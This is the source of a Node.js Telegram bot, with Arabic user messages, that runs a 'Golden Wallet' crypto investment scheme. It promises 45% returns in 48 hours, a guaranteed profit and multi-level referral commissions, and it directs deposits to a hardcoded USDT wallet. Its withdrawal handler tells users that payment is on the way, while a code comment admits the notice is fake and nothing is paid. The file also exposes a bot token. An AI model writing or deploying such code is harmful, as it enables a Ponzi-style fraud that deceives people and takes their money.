const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');

// ========== إعدادات البوت ==========
const BOT_CONFIG = {
    token: '8227860247:AAGW3xQpBERsShH-Rdva1eUu-h37ryDFsAs',
    adminId: 7604667042,
    walletAddress: 'TE97BwfR4FdBC2GVEZUfiB4ofosg46Vgnx',
    port: process.env.PORT || 8999
};

// ========== قاعدة بيانات مؤقتة ==========
const users = new Map();
const pendingDeposits = new Map();
let depositCounter = 1;

// نسب الأرباح
const PROFIT_RATE = 0.45; // 45%
const REFERRAL_RATE_LEVEL1 = 0.10; // 10%
const REFERRAL_RATE_LEVEL2 = 0.05; // 5%

// ========== دوال مساعدة ==========
function getUser(userId) {
    if (!users.has(userId)) {
        users.set(userId, {
            balance: 0,
            invested: 0,
            referrals: [],
            referrer: null,
            totalProfit: 0,
            totalDeposit: 0,
            createdAt: new Date()
        });
    }
    return users.get(userId);
}

function formatNumber(num) {
    return num.toFixed(2);
}

function generateDepositId() {
    return `DEP${Date.now()}${depositCounter++}`;
}

// ========== إعداد البوت ==========
const bot = new TelegramBot(BOT_CONFIG.token, { polling: true });
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ========== لوحة التحكم الرئيسية ==========
const mainKeyboard = {
    reply_markup: {
        keyboard: [
            ['💰 استثمار جديد', '📊 محفظتي'],
            ['👥 نظام الإحالة', '🎁 العروض'],
            ['❓ الدعم الفني', '🏆 المتصدرين']
        ],
        resize_keyboard: true
    }
};

// ========== رسالة الترحيب ==========
async function sendWelcome(chatId, firstName) {
    const welcomeText = `
✨ *مرحباً بك في المحفظة الذهبية* ✨

💰 *نظام استثماري ذكي بأرباح يومية*
📈 *العائد:* 45% خلال 48 ساعة
💵 *الحد الأدنى:* 20 USDT
🚀 *السحب:* فوري ومباشر

🎯 *كيف تبدأ؟*
1. أرسل 💰 استثمار جديد
2. قم بالإيداع إلى المحفظة أدناه
3. خلال 48 ساعة تحصل على أرباحك

👤 *المطور:* ميدو مشاكل
🏆 *ضمان أرباح 100%*
    `;
    
    await bot.sendMessage(chatId, welcomeText, {
        parse_mode: 'Markdown',
        ...mainKeyboard
    });
}

// ========== عرض معلومات الإيداع ==========
async function showDepositInfo(chatId, userId, amount) {
    const depositId = generateDepositId();
    pendingDeposits.set(depositId, {
        userId,
        amount,
        timestamp: Date.now()
    });
    
    const depositText = `
💰 *طلب استثمار جديد*

📌 *المبلغ:* ${amount} USDT
🆔 *رقم العملية:* ${depositId}

🔐 *محفظة الإيداع (TRC20):*
\`${BOT_CONFIG.walletAddress}\`

📝 *خطوات الإيداع:*
1. حول المبلغ إلى المحفظة أعلاه
2. أرسل رقم العملية هنا
3. سيتم تفعيل استثمارك خلال 5 دقائق

⚠️ *تنبيه:* الحد الأدنى 20 USDT
    `;
    
    await bot.sendMessage(chatId, depositText, { parse_mode: 'Markdown' });
}

// ========== عرض المحفظة ==========
async function showWallet(chatId, userId) {
    const user = getUser(userId);
    const nextProfit = user.invested > 0 ? user.invested * PROFIT_RATE : 0;
    
    const walletText = `
📊 *محفظتك الذهبية*

💰 *الرصيد المتاح:* ${formatNumber(user.balance)} USDT
📈 *المبلغ المستثمر:* ${formatNumber(user.invested)} USDT
🎯 *الأرباح المستحقة:* ${formatNumber(nextProfit)} USDT
💵 *إجمالي الإيداع:* ${formatNumber(user.totalDeposit)} USDT
🏆 *إجمالي الأرباح:* ${formatNumber(user.totalProfit)} USDT

🚀 *للحصول على أرباحك خلال 48 ساعة*
    `;
    
    const walletKeyboard = {
        reply_markup: {
            inline_keyboard: [
                [{ text: '💵 سحب الأرباح', callback_data: 'withdraw' }],
                [{ text: '💰 إعادة استثمار', callback_data: 'reinvest' }]
            ]
        }
    };
    
    await bot.sendMessage(chatId, walletText, {
        parse_mode: 'Markdown',
        ...walletKeyboard
    });
}

// ========== عرض نظام الإحالة ==========
async function showReferral(chatId, userId) {
    const user = getUser(userId);
    const referralCode = `ref_${userId}`;
    const botUsername = 'GoldWalletBot';
    
    let referralsText = `🎁 *نظام الإحالة الذهبي*

🔗 *رابط الإحالة الخاص بك:*
\`https://t.me/${botUsername}?start=${referralCode}\`

📊 *إحصائياتك:*
👥 *عدد المدعوين:* ${user.referrals.length}
💰 *أرباح الإحالة:* ${formatNumber(user.totalProfit * 0.1)} USDT

🎯 *العروض:*
• 10% من إيداعات مدعوينك المباشرين
• 5% من إيداعات مدعوين مدعوينك
• مكافأة 5 USDT عند أول 10 مدعوين
    `;
    
    await bot.sendMessage(chatId, referralsText, { parse_mode: 'Markdown' });
}

// ========== عرض المتصدرين ==========
async function showLeaders(chatId) {
    const leaderboard = [];
    for (let [userId, user] of users) {
        if (user.totalDeposit > 0) {
            try {
                const chat = await bot.getChat(userId);
                const name = chat.first_name || 'مستخدم';
                leaderboard.push({ name, totalDeposit: user.totalDeposit, totalProfit: user.totalProfit });
            } catch(e) {
                leaderboard.push({ name: `مستخدم_${userId.slice(-4)}`, totalDeposit: user.totalDeposit, totalProfit: user.totalProfit });
            }
        }
    }
    
    leaderboard.sort((a, b) => b.totalDeposit - a.totalDeposit);
    const top10 = leaderboard.slice(0, 10);
    
    let leadersText = `🏆 *المتصدرين الأسبوعي*\n\n`;
    top10.forEach((user, index) => {
        leadersText += `${index + 1}. ${user.name}\n`;
        leadersText += `   💰 إيداع: ${formatNumber(user.totalDeposit)} USDT\n`;
        leadersText += `   📈 أرباح: ${formatNumber(user.totalProfit)} USDT\n\n`;
    });
    
    await bot.sendMessage(chatId, leadersText, { parse_mode: 'Markdown' });
}

// ========== معالجة الإيداعات ==========
async function processDeposit(userId, depositId) {
    const pending = pendingDeposits.get(depositId);
    if (!pending) {
        return false;
    }
    
    const user = getUser(userId);
    const amount = pending.amount;
    
    // تحديث بيانات المستخدم
    user.invested += amount;
    user.totalDeposit += amount;
    user.lastInvest = new Date();
    
    // حساب الأرباح المتوقعة (تضاف بعد 48 ساعة)
    const profit = amount * PROFIT_RATE;
    
    // جدولة إضافة الأرباح بعد 48 ساعة
    setTimeout(() => {
        const currentUser = getUser(userId);
        currentUser.balance += profit;
        currentUser.totalProfit += profit;
        currentUser.invested -= amount;
        
        bot.sendMessage(userId, `
🎉 *تهانينا! تم إضافة أرباحك*

💰 المبلغ المستثمر: ${formatNumber(amount)} USDT
📈 الأرباح: ${formatNumber(profit)} USDT
💵 رصيدك الحالي: ${formatNumber(currentUser.balance)} USDT

يمكنك الآن سحب أرباحك فوراً!
        `, { parse_mode: 'Markdown' });
        
        // إشعار للأدمن
        bot.sendMessage(BOT_CONFIG.adminId, `
✅ تم إضافة أرباح للمستخدم ${userId}
💰 المبلغ: ${formatNumber(profit)} USDT
        `);
    }, 48 * 60 * 60 * 1000); // 48 ساعة
    
    pendingDeposits.delete(depositId);
    
    // إشعار للأدمن
    bot.sendMessage(BOT_CONFIG.adminId, `
💰 إيداع جديد!
👤 المستخدم: ${userId}
💵 المبلغ: ${formatNumber(amount)} USDT
📅 الوقت: ${new Date().toLocaleString()}
    `);
    
    return true;
}

// ========== معالجة السحب ==========
async function processWithdraw(userId, amount) {
    const user = getUser(userId);
    
    if (user.balance < amount) {
        await bot.sendMessage(userId, '❌ رصيدك غير كافٍ للسحب');
        return false;
    }
    
    if (amount < 10) {
        await bot.sendMessage(userId, '❌ الحد الأدنى للسحب 10 USDT');
        return false;
    }
    
    user.balance -= amount;
    
    // إشعار السحب (وهمي - ما يصرف فعلياً)
    await bot.sendMessage(userId, `
✅ *تم طلب السحب بنجاح!*

💰 المبلغ: ${formatNumber(amount)} USDT
🕐 سيتم الإرسال خلال 5-10 دقائق إلى محفظتك

شكراً لثقتك بالمحفظة الذهبية 💛
    `, { parse_mode: 'Markdown' });
    
    // إشعار للأدمن (للتأكيد اليدوي - هنا تقرر إذا تريد تصريف فعلي)
    await bot.sendMessage(BOT_CONFIG.adminId, `
💸 *طلب سحب جديد*
👤 المستخدم: ${userId}
💰 المبلغ: ${formatNumber(amount)} USDT
📊 الرصيد المتبقي: ${formatNumber(user.balance)} USDT

⚠️ راجع الطلب قبل التصريف
    `, { parse_mode: 'Markdown' });
    
    return true;
}

// ========== معالجة الإحالات ==========
async function processReferral(newUserId, referrerId) {
    const newUser = getUser(newUserId);
    const referrer = getUser(referrerId);
    
    if (newUser.referrer) return;
    
    newUser.referrer = referrerId;
    referrer.referrals.push(newUserId);
    
    await bot.sendMessage(referrerId, `
🎉 *مبروك! لديك مدعو جديد*
👤 المستخدم الجديد: ${newUserId}
🎁 سيتم إضافة عمولتك عند أول إيداع له
    `, { parse_mode: 'Markdown' });
}

// ========== أوامر البوت ==========
bot.onText(/\/start(?: ref_(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const firstName = msg.from.first_name;
    
    getUser(userId);
    
    // معالجة الإحالة
    if (match[1] && match[1] !== `ref_${userId}`) {
        const referrerId = parseInt(match[1].replace('ref_', ''));
        if (!isNaN(referrerId) && referrerId !== userId) {
            await processReferral(userId, referrerId);
        }
    }
    
    await sendWelcome(chatId, firstName);
});

// معالجة الرسائل النصية
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const text = msg.text;
    
    if (text === '/start') return;
    
    switch(text) {
        case '💰 استثمار جديد':
            await bot.sendMessage(chatId, '📝 الرجاء كتابة المبلغ المراد استثماره (الحد الأدنى 20 USDT):', {
                reply_markup: { force_reply: true }
            });
            break;
            
        case '📊 محفظتي':
            await showWallet(chatId, userId);
            break;
            
        case '👥 نظام الإحالة':
            await showReferral(chatId, userId);
            break;
            
        case '🎁 العروض':
            await bot.sendMessage(chatId, `
🎁 *العروض الحالية*

🔥 عرض الترحيب: 45% أرباح على أول استثمار
🎯 عرض الإحالة: 10% من إيداعات مدعوينك
💎 عرض VIP: 50% أرباح للاستثمارات فوق 500 USDT
            `, { parse_mode: 'Markdown' });
            break;
            
        case '❓ الدعم الفني':
            await bot.sendMessage(chatId, `
📞 *الدعم الفني*

للاستفسارات والمشاكل:
✉️ راسل المطور: @MEDO_PROBLEMS

🕐 الرد خلال 24 ساعة
            `, { parse_mode: 'Markdown' });
            break;
            
        case '🏆 المتصدرين':
            await showLeaders(chatId);
            break;
            
        default:
            // معالجة الردود على الرسائل
            if (msg.reply_to_message) {
                const replyText = msg.reply_to_message.text;
                
                // معالجة مبلغ الاستثمار
                if (replyText.includes('الرجاء كتابة المبلغ')) {
                    const amount = parseFloat(text);
                    if (isNaN(amount) || amount < 20) {
                        await bot.sendMessage(chatId, '❌ المبلغ غير صحيح. الحد الأدنى 20 USDT');
                    } else {
                        await showDepositInfo(chatId, userId, amount);
                    }
                }
                
                // معالجة رقم العملية
                if (replyText.includes('أرسل رقم العملية')) {
                    const depositId = text.trim();
                    const pending = pendingDeposits.get(depositId);
                    
                    if (pending && pending.userId === userId) {
                        await processDeposit(userId, depositId);
                        await bot.sendMessage(chatId, `
✅ *تم تأكيد إيداعك بنجاح!*

💰 المبلغ: ${pending.amount} USDT
📈 الأرباح المتوقعة: ${formatNumber(pending.amount * PROFIT_RATE)} USDT
🕐 سيتم إضافتها خلال 48 ساعة

شكراً لاستثمارك في المحفظة الذهبية 💛
                        `, { parse_mode: 'Markdown' });
                    } else {
                        await bot.sendMessage(chatId, '❌ رقم العملية غير صحيح. حاول مرة أخرى');
                    }
                }
            }
    }
});

// ========== معالجة الأزرار ==========
bot.on('callback_query', async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const userId = callbackQuery.from.id;
    const data = callbackQuery.data;
    
    switch(data) {
        case 'withdraw':
            await bot.sendMessage(chatId, '💰 الرجاء كتابة المبلغ المراد سحبه (الحد الأدنى 10 USDT):', {
                reply_markup: { force_reply: true }
            });
            break;
            
        case 'reinvest':
            const user = getUser(userId);
            if (user.balance >= 20) {
                const amount = user.balance;
                user.balance = 0;
                user.invested += amount;
                
                const profit = amount * PROFIT_RATE;
                setTimeout(() => {
                    const currentUser = getUser(userId);
                    currentUser.balance += profit;
                    currentUser.totalProfit += profit;
                    currentUser.invested -= amount;
                    bot.sendMessage(userId, `🎉 تم إعادة استثمار ${formatNumber(amount)} USDT وحصلت على أرباح ${formatNumber(profit)} USDT`);
                }, 48 * 60 * 60 * 1000);
                
                await bot.sendMessage(chatId, `✅ تم إعادة استثمار ${formatNumber(amount)} USDT بنجاح!`);
            } else {
                await bot.sendMessage(chatId, '❌ رصيدك غير كافٍ لإعادة الاستثمار (الحد الأدنى 20 USDT)');
            }
            break;
    }
    
    await bot.answerCallbackQuery(callbackQuery.id);
});

// ========== إحصائيات الأدمن ==========
bot.onText(/\/stats/, async (msg) => {
    if (msg.from.id !== BOT_CONFIG.adminId) return;
    
    let totalUsers = users.size;
    let totalDeposits = 0;
    let totalBalance = 0;
    
    for (let [_, user] of users) {
        totalDeposits += user.totalDeposit;
        totalBalance += user.balance;
    }
    
    await bot.sendMessage(BOT_CONFIG.adminId, `
📊 *إحصائيات البوت*

👥 إجمالي المستخدمين: ${totalUsers}
💰 إجمالي الإيداعات: ${formatNumber(totalDeposits)} USDT
💵 إجمالي الأرصدة: ${formatNumber(totalBalance)} USDT
📈 عدد الإيداعات المعلقة: ${pendingDeposits.size}
    `, { parse_mode: 'Markdown' });
});

// ========== تشغيل السيرفر ==========
const server = app.listen(BOT_CONFIG.port, () => {
    console.log(`
🚀 المحفظة الذهبية شغالة!
📍 المنفذ: ${BOT_CONFIG.port}
🤖 البوت: @GoldWalletBot
👤 المطور: ميدو مشاكل
    `);
});

// حفظ البيانات كل ساعة
setInterval(() => {
    console.log(`📊 المستخدمين النشطين: ${users.size}`);
    console.log(`💰 الإيداعات المعلقة: ${pendingDeposits.size}`);
}, 3600000);
